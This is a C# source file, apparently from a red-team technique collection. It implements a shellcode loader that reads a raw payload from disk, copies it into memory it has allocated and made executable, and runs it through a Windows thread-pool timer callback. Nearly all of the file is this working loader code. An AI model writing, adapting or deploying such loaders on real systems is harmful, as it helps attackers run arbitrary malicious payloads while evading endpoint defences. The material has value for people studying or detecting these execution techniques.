// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CreateThreadpoolTimer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: CreateThreadpoolTimer.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            LargeInteger lDueTime = new LargeInteger();
            FILETIME sFiletime = new FILETIME();
            lDueTime.QuadPart = -(10000000);
            sFiletime.DateTimeLow = (uint)lDueTime.Low;
            sFiletime.DateTimeHigh = (uint)lDueTime.High;

            IntPtr TPTimer = CreateThreadpoolTimer(hAlloc, IntPtr.Zero, IntPtr.Zero);
            SetThreadpoolTimer(TPTimer, ref sFiletime, 0, 0);

            System.Threading.Thread.Sleep(1500);

            WaitForThreadpoolTimerCallbacks(TPTimer, false);

            if (TPTimer != IntPtr.Zero)
            {
                CloseThreadpoolTimer(TPTimer);
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThreadpoolTimer(
            IntPtr pfnti,
            IntPtr pv,
            IntPtr pcbe);

        [DllImport("kernel32.dll")]
        static extern void SetThreadpoolTimer(
            IntPtr pti,
            ref FILETIME pv,
            uint msPeriod,
            uint msWindowLength);

        [DllImport("kernel32.dll")]
        static extern void WaitForThreadpoolTimerCallbacks(
            IntPtr pti,
            bool fCancelPendingCallbacks);

        [DllImport("kernel32.dll")]
        static extern void CloseThreadpoolTimer(
            IntPtr pti);

        [StructLayout(LayoutKind.Sequential)]
        public struct FILETIME
        {
            public uint DateTimeLow;
            public uint DateTimeHigh;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct LargeInteger
        {
            [FieldOffset(0)]
            public int Low;
            [FieldOffset(4)]
            public int High;
            [FieldOffset(0)]
            public long QuadPart;
            public long ToInt64()
            {
                return ((long)this.High << 32) | (uint)this.Low;
            }

            public static LargeInteger FromInt64(long value)
            {
                return new LargeInteger
                {
                    Low = (int)(value),
                    High = (int)((value >> 32))
                };
            }

        }
    }
}
